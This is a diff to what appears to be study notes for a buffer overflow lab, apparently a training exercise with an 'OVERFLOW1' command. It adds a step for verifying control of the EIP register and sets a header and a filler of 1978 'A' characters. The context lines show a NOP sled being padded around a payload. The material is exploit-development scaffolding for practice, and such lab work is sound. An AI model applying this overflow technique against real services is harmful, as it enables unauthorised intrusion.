@@ -40,3 +40,10 @@ extend = "\x90" * (400 - (len(payload_calc) + (len(nop_sled)))
 ## Eip Test
 
 Verification of Control of EIP register
+
+Adjust the filler to enable the overflow and the correct header for the specific overflow program
+
+```python
+header = "OVERFLOW1 "
+filler = "A" * 1978
+```
